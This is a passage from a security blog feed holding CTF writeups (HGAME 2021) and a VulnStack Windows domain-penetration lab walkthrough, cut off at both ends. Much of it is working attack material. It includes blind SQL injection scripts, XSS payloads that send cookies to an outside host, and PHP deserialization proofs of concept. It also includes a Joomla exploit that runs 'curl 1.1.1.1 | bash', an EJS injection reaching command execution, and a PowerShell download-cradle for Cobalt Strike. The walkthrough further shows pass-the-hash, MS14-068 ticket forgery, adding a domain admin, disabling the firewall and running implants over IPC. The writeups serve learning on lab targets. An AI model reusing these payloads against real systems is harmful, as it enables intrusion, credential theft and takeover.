&quot;admin\\\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125; # data2=&#123;&quot;username&quot;: &quot;admin\\\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1))/**/&gt;/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125; # data1=&#123;&quot;username&quot;: &quot;admin\\\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/0x7535657273),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125; # data2=&#123;&quot;username&quot;: &quot;admin\\\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/0x7535657273),&#123;&#125;,1))/**/&gt;/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125; data1=&#123;&quot;username&quot;: &quot;admin\\\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(`p@ssword`)/**/from/**/u5ers),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125; data2=&#123;&quot;username&quot;: &quot;admin\\\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(`p@ssword`)/**/from/**/u5ers),&#123;&#125;,1))/**/&gt;/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125; try: print(i,mid) r1=requests.post(url,data=data1,timeout=3,proxies=proxies,verify=False) except requests.exceptions.ReadTimeout as e: flag+=chr(mid) print(flag) break except Exception as e: pass else: try: r2=requests.post(url,data=data2,timeout=3,proxies=proxies,verify=False) except requests.exceptions.ReadTimeout as e: low=mid+1 except Exception as e: pass else: top=mid-1 if flag==f1: breakprint(flag)# week3sqli# u5ers# usern@me,p@ssword Post to zuckonit2.0xss 测了测 发现把&lt;&gt;都替换成空了 不过增加了一个替换功能 猜测关键点肯定在这 每次改变发现变的内容都在js的两个参数 能不能js注入？试下吧 1&quot;;alert(1);&quot; 发现第一个参数将&quot;实体编码了 但是第二个没有 并且成功弹窗 换成盗取cookie的payload: 1&quot;;document.location=&#x27;http://1.1.1.1:9000/?&#x27;+document.cookie;&quot; 淦 貌似只会访问首页 啊这 仔细看了看 无意间看到了 TMD 竟然有源码 app.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109@app.route(&#x27;/&#x27;)def home(): response = make_response(render_template(&quot;index.html&quot;)) response.headers[&#x27;Set-Cookie&#x27;] = &quot;token=WELCOME TO HGAME 2021.;&quot; response.headers[&#x27;Content-Security-Policy&#x27;] = &quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;;&quot; return response@app.route(&#x27;/preview&#x27;)def preview(): if session.get(&#x27;substr&#x27;) and session.get(&#x27;replacement&#x27;): substr = session[&#x27;substr&#x27;] replacement = session[&#x27;replacement&#x27;] else: substr = &quot;&quot; replacement = &quot;&quot; response = make_response( render_template(&quot;preview.html&quot;, substr=substr, replacement=replacement)) return response@app.route(&#x27;/send&#x27;, methods=[&#x27;POST&#x27;])def send(): if request.form.get(&#x27;content&#x27;): content = escape_index(request.form[&#x27;content&#x27;]) if session.get(&#x27;contents&#x27;): content_list = session[&#x27;contents&#x27;] content_list.append(content) else: content_list = [content] session[&#x27;contents&#x27;] = content_list return &quot;post has been sent.&quot; else: return &quot;WELCOME TO HGAME 2021 :)&quot;@app.route(&#x27;/replace&#x27;, methods=[&quot;POST&quot;])def replace(): if request.form.get(&#x27;substr&#x27;) and request.form.get(&#x27;replacement&#x27;): session[&#x27;substr&#x27;] = escape_replace(request.form[&#x27;substr&#x27;]) session[&#x27;replacement&#x27;] = escape_replace(request.form[&#x27;replacement&#x27;]) return &quot;replace success&quot; else: return &quot;There is no content to replace any more&quot;@app.route(&#x27;/contents&#x27;, methods=[&quot;GET&quot;])def get_contents(): if session.get(&#x27;contents&#x27;): content_list = jsonify(session[&#x27;contents&#x27;]) else: content_list = jsonify(&#x27;&lt;i&gt;2021-02-12&lt;/i&gt;&lt;p&gt;Happy New Year every guys! &#x27; &#x27;Maybe it is nearly done now.&lt;/p&gt;&#x27;, &#x27;&lt;i&gt;2021-02-11&lt;/i&gt;&lt;p&gt;Busy preparing for the Chinese New Year... &#x27; &#x27;And I add some new features to this editor, maybe you can take a try. &#x27; &#x27;But it has not done yet, I\\&#x27;m not sure if it can be safe from attacks.&lt;/p&gt;&#x27;, &#x27;&lt;i&gt;2021-02-07&lt;/i&gt;&lt;p&gt;so many hackers here, I am going to add some strict rules.&lt;/p&gt;&#x27;, &#x27;&lt;i&gt;2021-02-06&lt;/i&gt;&lt;p&gt;I have tried to learn HTML the whole yesterday, &#x27; &#x27;and I finally made this ONLINE BLOG EDITOR. Feel free to write down your thoughts.&lt;/p&gt;&#x27;, &#x27;&lt;i&gt;2021-02-05&lt;/i&gt;&lt;p&gt;Yesterday, I watched &lt;i&gt;The Social Network&lt;/i&gt;. &#x27; &#x27;It really astonished me. Something flashed me.&lt;/p&gt;&#x27;) return content_list@app.route(&#x27;/code&#x27;, methods=[&quot;GET&quot;])def get_code(): if session.get(&#x27;code&#x27;): return Response(response=json.dumps(&#123;&#x27;code&#x27;: session[&#x27;code&#x27;]&#125;), status=200, mimetype=&#x27;application/json&#x27;) else: code = create_code() session[&#x27;code&#x27;] = code return Response(response=json.dumps(&#123;&#x27;code&#x27;: code&#125;), status=200, mimetype=&#x27;application/json&#x27;)@app.route(&#x27;/flag&#x27;)def show_flag(): if request.cookies.get(&#x27;token&#x27;) == &quot;29342ru89j3thisisfakecookieq983h23ijfq2ojifrnq92h2&quot;: return &quot;hgame&#123;G3t_fl@g_s0_Easy?No_way!!wryyyyyyyyy&#125;&quot; else: return &quot;Only admin can get the flag, your token shows that you&#x27;re not admin!&quot;@app.route(&#x27;/clear&#x27;)def clear_session(): session[&#x27;contents&#x27;] = [] return &quot;ALL contents are cleared.&quot;def escape_index(original): content = original content_iframe = re.sub(r&quot;^(&lt;?/?iframe)\\s+.*?(src=[\\&quot;&#x27;][a-zA-Z/]&#123;1,8&#125;[\\&quot;&#x27;]).*?(&gt;?)$&quot;, r&quot;\\1 \\2 \\3&quot;, content) if content_iframe != content or re.match(r&quot;^(&lt;?/?iframe)\\s+(src=[\\&quot;&#x27;][a-zA-Z/]&#123;1,8&#125;[\\&quot;&#x27;])$&quot;, content): return content_iframe else: content = re.sub(r&quot;&lt;*/?(.*?)&gt;?&quot;, r&quot;\\1&quot;, content) return contentdef escape_replace(original): content = original content = re.sub(&quot;[&lt;&gt;]&quot;, &quot;&quot;, content) return contentdef create_code(): hashobj = hashlib.md5() hashobj.update(bytes(str(time.time()), encoding=&#x27;utf-8&#x27;)) code_hash = hashobj.hexdigest()[:6] return code_hash escape_index函数这不就是个后门吗？ 并且有csp 1Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; 只允许引用来自同端口，同域名，同协议的资源 和上面串起来了 构造 1&lt;iframe src=&#x27;/preview&#x27;&gt; 然后再提交bot就行了 有点懵 bot是带着我们的session访问的？不管了 Post to zuckonit another version还是可以利用iframe标签引入资源 1&lt;iframe src=&#x27;/preview&#x27;&gt; 和上面基本一样 唯一改变的地方就是替换变成搜索了 123456789101112131415161718&lt;script&gt; $(function () &#123; $.get(&quot;/contents&quot;).done(function (data) &#123; let content = &quot;aaa&quot; let output = document.getElementById(&quot;output&quot;) for (let i = 0; i &lt; data.length; i++) &#123; let div = document.createElement(&quot;div&quot;) if (content !== &quot;&quot;) &#123; let substr = new RegExp(content, &#x27;g&#x27;) div.innerHTML = data[i].replace(substr, `&lt;b class=&quot;search_result&quot;&gt;$&#123;content&#125;&lt;/b&gt;`) output.appendChild(div) &#125; else &#123; output.appendChild(div) &#125; &#125; &#125;) &#125;)&lt;/script&gt; 这里利用就是$1 即正则匹配的分组 默认情况下是 有一些标签的 利用正则匹配分组将&lt;和&gt;匹配出来 拼接过去就行 payload 直接用script貌似不行： 1(.&#123;1&#125;)iframe src&#x3D;(.*?)preview(.*?) (.&#123;1&#125;)|$1img src&#x3D;&#39;&#x2F;aaa&#39; onerror&#x3D;&#39;alert(1)&#39;$4|aaaa 发现可以弹窗 替换成盗cookie的 1(.&#123;1&#125;)iframe src&#x3D;(.*?)preview(.*?) (.&#123;1&#125;)|$1img src&#x3D;&#39;&#x2F;aaa&#39; onerror&#x3D;&#39;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;period;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;equals;&amp;apos;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;colon;&amp;sol;&amp;sol;&amp;#49;&amp;#48;&amp;#51;&amp;period;&amp;#49;&amp;#53;&amp;#50;&amp;period;&amp;#49;&amp;#51;&amp;#50;&amp;period;&amp;#49;&amp;#54;&amp;colon;&amp;#57;&amp;#48;&amp;#48;&amp;#48;&amp;sol;&amp;quest;&amp;apos;&amp;plus;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;period;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&#39;$4|aaaa 实体编码那部分是 1document.location=&#x27;http://1.1.1.1:9000/?&#x27;+document.cookie Arknights.git泄露 simulator.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153&lt;?phpclass Simulator&#123; public $session; public $cardsPool; public function __construct()&#123; $this-&gt;session = new Session(); if(array_key_exists(&quot;session&quot;, $_COOKIE))&#123; $this-&gt;session-&gt;extract($_COOKIE[&quot;session&quot;]); &#125; $this-&gt;cardsPool = new CardsPool(&quot;./pool.php&quot;); $this-&gt;cardsPool-&gt;init(); &#125; public function draw($count)&#123; $result = array(); for($i=0; $i&lt;$count; $i++)&#123; $card = $this-&gt;cardsPool-&gt;draw(); if($card[&quot;stars&quot;] == 6)&#123; $this-&gt;session-&gt;set(&#x27;&#x27;, $card[&quot;No&quot;]); &#125; $result[] = $card; &#125; $this-&gt;session-&gt;save(); return $result; &#125; public function getLegendary()&#123; $six = array(); $data = $this-&gt;session-&gt;getAll(); foreach ($data as $item) &#123; $six[] = $this-&gt;cardsPool-&gt;cards[6][$item]; &#125; return $six; &#125;&#125;class CardsPool&#123; public $cards; private $file; public function __construct($filePath) &#123; if (file_exists($filePath)) &#123; $this-&gt;file = $filePath; &#125; else &#123; die(&quot;Cards pool file doesn&#x27;t exist!&quot;); &#125; &#125; public function draw() &#123; $rand = mt_rand(1, 100); $level = 0; if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) &#123; $level = 3; &#125; elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) &#123; $level = 4; &#125; elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) &#123; $level = 5; &#125; elseif ($rand == 100) &#123; $level = 6; &#125; $rand_key = array_rand($this-&gt;cards[$level]); return array( &quot;stars&quot; =&gt; $level, &quot;No&quot; =&gt; $rand_key, &quot;card&quot; =&gt; $this-&gt;cards[$level][$rand_key] ); &#125; public function init() &#123; $this-&gt;cards = include($this-&gt;file); &#125; public function __toString()&#123; return file_get_contents($this-&gt;file); &#125;&#125;class Session&#123; private $sessionData; const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;; public function __construct()&#123;&#125; public function set($key, $value)&#123; if(empty($key))&#123; $this-&gt;sessionData[] = $value; &#125;else&#123; $this-&gt;sessionData[$key] = $value; &#125; &#125; public function getAll()&#123; return $this-&gt;sessionData; &#125; public function save()&#123; $serialized = serialize($this-&gt;sessionData); $sign = base64_encode(md5($serialized . self::SECRET_KEY)); $value = base64_encode($serialized) . &quot;.&quot; . $sign; setcookie(&quot;session&quot;,$value); &#125; public function extract($session)&#123; $sess_array = explode(&quot;.&quot;, $session); $data = base64_decode($sess_array[0]); $sign = base64_decode($sess_array[1]); if($sign === md5($data . self::SECRET_KEY))&#123; $this-&gt;sessionData = unserialize($data); &#125;else&#123; unset($this-&gt;sessionData); die(&quot;Go away! You hacker!&quot;); &#125; &#125;&#125;class Eeeeeeevallllllll&#123; public $msg=&quot;坏坏liki到此一游&quot;; public function __destruct() &#123; echo $this-&gt;msg; &#125;&#125; index.php 123456789&lt;?phperror_reporting(0);require_once (&quot;simulator.php&quot;);$simulator = new Simulator();$cards = array();if(isset($_POST[&quot;draw&quot;]))&#123; $cards = $simulator-&gt;draw($_POST[&quot;draw&quot;]);&#125;?&gt; 盲猜反序列化 找__toString 有可能会有任意文件读取 这不很简单吗？ 找反序列化点吧 看下那里调用了extract方法 poc: 12345678910111213141516171819202122&lt;?phpclass CardsPool&#123; private $file; public function __construct() &#123; $this-&gt;file = &#x27;flag.php&#x27;; &#125;&#125;class Eeeeeeevallllllll&#123; public $msg; public function __construct() &#123; $this-&gt;msg = new CardsPool(); &#125;&#125;$a = new Eeeeeeevallllllll();// echo base64_encode(serialize($a));$key = &#x27;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&#x27;;echo base64_encode(serialize($a)).&#x27;.&#x27;.base64_encode(md5(serialize($a).$key)); miscA R K发现有ftp 筛选ftp-data 追踪tcp流发现 ssl log 保存到文件 编辑-&gt;首选项-&gt;协议-&gt;TLS 再次筛选http 发现就有东西了 导出http对象 发现有串base64加密的字符串 追踪http流也能得到 解码得到 压缩包 保存下来 直接打开提示 week4web漫无止境的星期日nodejs 原型链污染 + ejs模板注入 查看源代码发现/static/www.zip得到源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071const express = require(&#x27;express&#x27;)const bodyParser = require(&#x27;body-parser&#x27;)const session = require(&#x27;express-session&#x27;)const randomize = require(&#x27;randomatic&#x27;)const ejs = require(&#x27;ejs&#x27;);const path = require(&quot;path&quot;);const app = express()app.use(bodyParser.urlencoded(&#123; extended: true &#125;)).use(bodyParser.json())app.use(&#x27;/static&#x27;, express.static(&#x27;static&#x27;))app.use(session(&#123; name: &#x27;session&#x27;, secret: randomize(&#x27;aA0&#x27;, 16), resave: false, saveUninitialized: false&#125;))app.set(&#x27;views&#x27;, &#x27;./views&#x27;)app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;)app.all(&#x27;/&#x27;, (req, res) =&gt; &#123; let data = &#123; name: &quot;&quot;, discription: &quot;&quot; &#125; if (req.ip === &quot;::ffff:127.0.0.1&quot;) &#123; data.crying = true &#125; if (req.method == &#x27;POST&#x27;) &#123; Object.keys(req.body).forEach((key) =&gt; &#123; if (key !== &quot;crying&quot;) &#123; data[key] = req.body[key] &#125; &#125;) req.session.crying = data.crying req.session.name = data.name req.session.discription = data.discription return res.redirect(302, &#x27;/show&#x27;); &#125; return res.render(&#x27;loop&#x27;)&#125;)app.all(&#x27;/show&#x27;, (req, res) =&gt; &#123; if (!req.session.name || !req.session.discription) &#123; return res.redirect(302, &#x27;/&#x27;); &#125; let wishes = req.session.wishes ? req.session.wishes : &quot;&quot; return res.render(&#x27;show&#x27;, &#123; name: req.session.name, discription: req.session.discription, wishes: wishes &#125;)&#125;)app.all(&#x27;/wish&#x27;, (req, res) =&gt; &#123; if (!req.session.crying) &#123; return res.send(&quot;forbidden.&quot;) &#125; if (req.method == &#x27;POST&#x27;) &#123; let wishes = req.body.wishes req.session.wishes = ejs.render(`&lt;div class=&quot;wishes&quot;&gt;$&#123;wishes&#125;&lt;/div&gt;`) return res.redirect(302, &#x27;/show&#x27;); &#125; return res.render(&#x27;wish&#x27;);&#125;)app.listen(3000, () =&gt; console.log(`App start on port 3000!`)) 原型链污染出现在 12345Object.keys(req.body).forEach((key) =&gt; &#123; if (key !== &quot;crying&quot;) &#123; data[key] = req.body[key] &#125;&#125;) 构造 1234567POST / HTTP/1.1Host: macguffin.0727.site:5000Content-Type: application/jsonCookie: session=s%3AwAcqo_ZTsY89vKXsAyZaHShlpscCKww6.WB2AVS3298UqJDeylhn9Ek8SghOW%2BjZ9tcRb2gUJObgContent-Length: 74&#123;&quot;__proto__&quot;:&#123;&quot;crying&quot;:&quot;crying&quot;&#125;,&quot;name&quot;:&quot;MoonBack&quot;,&quot;discription&quot;:&quot;hack&quot;&#125; 接着替换新的cookie给/wish 并POST过去wishes值为 进行模板注入 1&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;) %&gt; 在用相同的cookie访问/show就有flag了 joomlaJoomla!!!!!有源码 根据时间搜下 看看哪些文件最近改动了 只有两个文件 1find ./ -type f -mtime -5 | grep php 版本信息位于 1&#x2F;administrator&#x2F;manifests&#x2F;files&#x2F;joomla.xml 参考： https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562 poc: 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass JSimplepieFactory &#123;&#125;class JDatabaseDriverMysql &#123;&#125;class SimplePie &#123; var $sanitize; var $cache; var $cache_name_function; var $javascript; var $feed_url; function __construct() &#123; $this-&gt;feed_url = &quot;system(&#x27;curl 1.1.1.1 | bash&#x27;);JFactory::getConfig();exit;&quot;; $this-&gt;javascript = 9999; $this-&gt;cache_name_function = &quot;assert&quot;; $this-&gt;sanitize = new JDatabaseDriverMysql(); $this-&gt;cache = true; &#125;&#125;class JDatabaseDriverMysqli &#123; protected $a; protected $disconnectHandlers; protected $connection; function __construct() &#123; $this-&gt;a = new JSimplepieFactory(); $x = new SimplePie(); $this-&gt;connection = 1; $this-&gt;disconnectHandlers = [ [$x, &quot;init&quot;], ]; &#125;&#125;$a = new JDatabaseDriverMysqli();$poc = serialize($a); $poc = str_replace(&quot;\\x00*\\x00&quot;, &#x27;\\\\0\\\\0\\\\0&#x27;, $poc);echo &quot;123&#125;__test||&#123;$poc&#125;\\xF0\\xFD\\xFD\\xFD&quot;; 推荐在线运行：https://sandbox.onlinephpfunctions.com/","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"从VlunStack靶机二学习域渗透","slug":"从VlunStack靶场二学习域渗透","date":"2020-12-14T03:56:20.000Z","updated":"2020-12-27T12:05:17.396Z","comments":true,"path":"2020/12/14/从VlunStack靶场二学习域渗透/","link":"","permalink":"http://www.moonback.xyz/2020/12/14/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/","excerpt":"闲来无事，跟着大佬思路做下！！！","text":"闲来无事，跟着大佬思路做下！！！ 环境说明靶机链接：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/ 内网网段：10.10.10.1/24 DMZ网段：192.168.111.1/24 测试机地址：192.168.111.1（Windows），192.168.111.11（Linux） 防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）： 12deny all tcp ports：10.10.10.1allow all tcp ports：10.10.10.0&#x2F;24 DC IP：10.10.10.10 OS：Windows 2012(64) 应用：AD域 WEB IP1：10.10.10.80 IP2：192.168.111.80 OS：Windows 2008(64) 应用：Weblogic 10.3.6 MSSQL 2008 PC IP1：10.10.10.201 IP2：192.168.111.201 OS：Windows 7(32) 应用： 攻击机 IP：192.168.111.1 OS：Windows 10(64) IP：192.168.111.11 OS：Parrot(64) 一些名词概念DMZ英文为demilitarized zone，中文名称为“隔离区”，也称“非军事化区”，是指内外网防火墙之间的区域，DMZ区是一个缓冲区，在DMZ区存放着一些公共服务器，比如论坛等。 DMZ的特点如下： 内网可以访问外网，内网的用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。 内网可以访问DMZ，此策略使内网用户可以使用或者管理DMZ中的服务器。 外网不能访问内网，这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果要访问，就要通过VPN方式来进行。 外网可以访问DMZ，DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。 DMZ不能访问内网，如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。 DMZ不能访问外网，此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。 AD活动目录（Active Directory）主要是指是面向Windows Server的目录服务。（Active Directory不能运行在Windows Web Server上，但是可以通过它对运行Windows Web Server的计算机进行管理。）Active Directory存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。Active Directory使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。 DC域控制器( Domain controller，DC)是活动目录的存储位置,安装了活动目录的计算机称为域控制器。 网络配置在虚拟网络配置器里增加一个网卡 这里添加的是VMnet2 设置如下: 注意将主机虚拟适配器连接到此网络取消勾选 子网ip设置为10.10.10.0 接着修改下NAT的网段 改成192.168.111.0 各靶机的连接情况： 123DC &#x3D;&#x3D;&gt; VMnet2WEB &#x3D;&#x3D;&gt; VMnet2 NATPC &#x3D;&#x3D;&gt; VMnet2 NAT 关于网络设置 我也不是很懂 web那个是dmz按理说不能出网的 但不出网又没法反弹shell 拿下web机器weblogic到cs上线web机器上的weblogic服务默认没有开启 找到C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin目录 右键以管理员身份运行startWebLogic.bat 访问：http://192.168.111.80:7001/ 使用GitHub上覆盖漏洞最多最全的检测工具：https://github.com/0xn0ne/weblogicScanner 这个是基于star最多的那个并进行了bug修复，提高了准确性 开一个kali NAT连接网络作为攻击机 克隆下来 检测目标 发现确实存在不少漏洞 但是不太明显具体哪个洞 使用grep筛选一下 这个靶场是比较老的 考虑到当时可能还没有这些新洞 所以我们使用老洞进行打 就拿第一个CVE-2017-3248来弄吧 参考：https://www.anquanke.com/post/id/225137 首先要准备两个东西 java反序列化工具ysoserial Github：https://github.com/frohoff/ysoserial 直接下载打包好的jar文件：https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar 这个工具路径需要全为英文 另外一个就是exploit-db上的poc：https://www.exploit-db.com/exploits/44553 先测试下能不能用 宿主机起一个JRMP服务 kali使用poc攻击 可以看到已经能命令执行 尝试用powershell反弹cs 这里我在kali起cs 宿主机作为客户端控制cs 先开启cs 先新建一个监听器 生成payload 选择： 由于命令太长 这里在宿主机起一个web服务 直接使用python起一个 1python -m http.server 8000 继续使用那个脚本来进行命令执行 这里要执行的命令就是 即从远程加载powershell命令执行 1powershell.exe iex (new-object net.webclient).downloadstring(&#x27;http://192.168.111.1:8000/payload.txt&#x27;) 所有环境都准备好了 开打 看到有请求发送 cs也可以上线 当前权限为Administrator 尝试使用getsystem命令失败 提权systeminfo查看系统信息 发现系统为 1Microsoft Windows Server 2008 R2 Standard 补丁就三个 应该好提权 123[01]: KB2999226[02]: KB958488[03]: KB976902 为了方便直接使用cs的插件提权：https://github.com/pandasec888/taowu-cobalt-strike 直接用ms14-058 可以看到已经收到一个system的会话 提权成功 下面再介绍一些技巧 cs/msf会话互转cs会话转msf msf监听 1handler -H 192.168.111.128 -P 4444 -p windows/meterpreter/reverse_http cs增加会话 新增一个监听器 ip端口填对应就行 选中目标 选中监听器确定就行 这边msf已经接收到会话 或者选择spawn as 选择对应的监听器 msf会话转cs 1234567use exploit/windows/local/payload_injectset payload windows/meterpreter/reverse_httpset session 1set lhost 192.168.111.128set lport 369set disablepayloadhandler truerun 可以看到cs里已经收到会话 拿下域控现在我们已经有一台机器的shell了 想怎么拿到域控的权限？接着就是后渗透部分了 域内信息收集判断web机器是否在域内 如下命令: 可以查看主机所有网卡的获取到的ip地址 一般情况下某个网段的dns服务器就是域控 1ipconfig /all 信息收集 1234567891011121314151617181920net view /domain # 查看所有域net time /domain #查看域内时间 会列出时间服务器 即域控ping -n 1 DC -4 #获取域控ip地址net user /domain #查看域用户 dsquery user #查看域用户net group /domain #查询域组名称net group &quot;Domain Admins&quot; /Domain #查询域管理员net group &quot;Domain Controllers&quot; /domain #查询域控# 添加普通域用户 net user lemon iam@L3m0n /add /domain # 将普通域用户提升为域管理员 net group &quot;Domain Admins&quot; lemon /add /domain# 查询所有计算机名称net group &quot;Domain Computers&quot; /domain# 查看共享net view \\\\10.10.10.10 端口扫描 发现存活主机 在这可以看到 横向移动代理转发首先设置代理 直接使用cs sock4代理 kali proxychains设置代理 修改/etc/proxychains.conf 使用代理打开火狐浏览器 访问127.0.0.1:7001 发现是weblogic的页面说明已经成功代理出来 1proxychains firefox 使用代理使用nmap对域控10.10.10.10进行扫描 扫描发现存在ms17-010漏洞 这时候就有一个问题了 由于域控只有一个网卡 并且是host only模式 所以没办法直接反弹shell 需要让web机器做跳转 这个问题我们后面再说 先看看怎么把马传到域控上并执行 Pass the Hash首先我们可以使用logonpasswords抓取下明文密码 几个用户的密码都是这个 在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。但是目标系统为Windows 2008(64)，因此可以抓到明文密码 再说说Pass the Hash，哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 直接使用cs里面的pth命令 用法: 1pth domain\\user NTLM 直接列下dc上的文件shell dir \\\\DC.de1ay.com 提示拒绝访问 我们需要制作令牌 使用明文密码 使用hash Pass the Ticket这里使用ms14-068攻击 对应CVE-2014-6324 当拿到了一个普通域成员的账号后，想继续对该域进行渗透，如果域控服务器存在MS14_068漏洞，并且未打补丁，那么我们就可以利用MS14_068快速获得域控服务器权限 对应补丁号为kb3011780 可以从systeminfo获取 也可以使用 1wmic qfe get hotfixid 接下来使用的工具叫PyKEK 是一个利用 Kerberos 协议进行渗透测试的工具包 地址：https://github.com/mubix/pykek 下载下来 可以使用 PyKEY 可以生成一张高权限的服务票据，并通过 mimikatz 将服务票据注入内存。 先查看本地de1ay的sid 1whoami /user 或者 1wmic useraccount get name,sid 查看域用户 需要system权限查看 尝试使用de1ay用户制作票据 1proxychains python ms14-068.py -u de1ay@de1ay.com -s S-1-5-21-3767205380-3469466069-2137393323-500 -d 10.10.10.10 -p &#x27;1qaz@WSX&#x27; 使用 KrbCredExport进行转换 1python KrbCredExport.py ../pykek/TGT_de1ay@de1ay.com.ccache de1ay.ticket 用cs将票据注入内存中 先清除之前的凭证 12kerberos_ticket_purgekerberos_ticket_use D:\\de1ay.ticket 不知道为啥不行 换成exe也不行 哭了 过段时间再研究吧 后来发现换成ip就行了 哭了 加用户Administrator不行 system可以 domain还要大写 加到管理员组 IPC连接假设现在我们现在已经增加一个用户了 实际并没 只能使用默认账户 我们可以使用ipc连接将马传上去 不知道为啥sysytem权限的会话可以直接列目录 12shell net use \\\\10.10.10.10\\c$ P@ssword &#x2F;user:hackershell dir \\\\DC.de1ay.com\\c$ 关闭连接的话使用 1shell net use \\\\10.10.10.10\\c$ &#x2F;del 关闭防火墙 1netsh advfirewall set allprofiles state off 新建一个中转 使用cs生成exe 使用shell的copy命令将马拷到dc上 1shell copy C:\\Windows\\Temp\\artifact.exe \\\\10.10.10.10\\c$\\windows\\temp\\1.exe cs设置监听 使用wmic执行木马 1shell wmic &#x2F;node:10.10.10.10 &#x2F;user:hacker &#x2F;password:P@ssword process call create &quot;C:\\Windows\\Temp\\1.exe&quot; 但是这样貌似不行 psexec增加一个中转 目标 psexec 监听器选择中转 域控上线 同样的方式pc也能上线 全部上线截图 参考： https://www.anquanke.com/post/id/193193 https://wh0ale.github.io/2019/12/11/VulnStack%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ http://akevin.cn/index.php/archives/985/ https://yoga7xm.top/2019/12/03/vulnstack2/ https://xz.aliyun.com/t/8690 https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/","categories":[],"tags":[{"name":"vulnstack","slug":"vulnstack","permalink":"http://www.moonback.xyz/tags/vulnstack/"},{"name":"域渗透","slug":"域渗透","permalink":"http://www.moonback.xyz/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"RoarCTF2020部分writeup","slug":"RoarCTF2020部分writeup","date":"2020-12-05T15:06:33.000Z","updated":"2020-12-05T17:14:02.204Z","comments":true,"path":"2020/12/05/RoarCTF2020部分writeup/","link":"","permalink":"http://www.moonback.xyz/2020/12/05/RoarCTF2020%E9%83%A8%E5%88%86writeup/","excerpt":"ccc 太菜了！！！","text":"ccc 太菜了！！！ webezsqlfuzz一下过滤了 1空格 select union ; if 写脚本bool盲注： 1234567891011121314151617181920212223242526272829303132333435363738import requestsurl = &#x27;http://139.129.98.9:30003/login.php&#x27;flag=&#x27;&#x27;proxies=&#123; &quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;for i in range(1,50): f1=flag top=127 low=33 while 